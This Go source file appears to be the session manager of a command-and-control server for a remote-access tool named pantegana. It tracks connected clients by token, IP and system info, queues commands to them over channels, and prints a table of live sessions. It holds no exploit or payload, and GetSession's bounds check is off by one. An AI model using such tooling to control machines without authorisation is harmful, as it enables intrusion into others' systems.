package server

import (
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"strings"
	"sync"

	client "github.com/elleven11/pantegana/client"
)

type Session struct {
	Token   string
	Cmd     chan string
	Open    bool
	IP      string // Could be both IPv4 and IPv6
	SysInfo client.SysInfo
}

var sessions []Session

var mutex sync.Mutex

// errors
var (
	ErrSessionIsClosed          = errors.New("The requested session is closed.")
	ErrSessionDoesNotExist      = errors.New("The requested session does not exist.")
	ErrUnrecognizedSessionToken = errors.New("The requested session token does not corelate with any current sessions.")
	ErrUndefinedSessionInCLI    = errors.New("Undefined session. Define one with the -s flag")
)

func CreateSession(req *http.Request) (int, bool) {
	token := req.Header.Get("token")

	// initialize sessions slice
	if sessions == nil {
		sessions = make([]Session, 0)
	}

	index := FindSessionIndexByToken(token)
	if index != -1 {
		return index, false
	}

	// control session flow so that the return index cannot get confused
	mutex.Lock()

	sessions = append(sessions, Session{
		Token: token,
		Cmd:   make(chan string),
		IP:    GetIP(req),
		Open:  true,
	})

	mutex.Unlock()
	return FindSessionIndexByToken(token), true
}

func GetSession(idx int) (*Session, error) {
	if idx > len(sessions) || idx < 0 {
		return nil, ErrSessionDoesNotExist
	}
	return &sessions[idx], nil
}

func (s *Session) WriteToCmd(command string) error {
	if s.Open == false {
		return ErrSessionIsClosed
	}
	s.Cmd <- command
	return nil
}

func FindSessionIndexByToken(token string) int {
	for i := 0; i < len(sessions); i++ {
		if sessions[i].Token == token {
			return i
		}
	}
	return -1
}

func PrettyPrintSessions() {
	header := "||                          Sessions                          ||"
	spacer := strings.Repeat("=", len(header))
	output := fmt.Sprintf("%s\n%s\n%s\n", spacer, header, spacer)
	for i, session := range sessions {
		if session.Open {
			fragment := fmt.Sprintf("|| ID: %d - IP: %s - Token: %s", i, session.IP, session.Token)
			sessionInfo := fmt.Sprintf("%s%s||\n%s\n", fragment, strings.Repeat(" ", len(header)-len(fragment)-2), spacer)
			json, _ := json.MarshalIndent(session.SysInfo, "", "\t")
			sessionInfo = fmt.Sprintf("%s%s\n%s\n", sessionInfo, json, spacer)
			output += sessionInfo
		}
	}
	cli.Printf("%s", output)
}
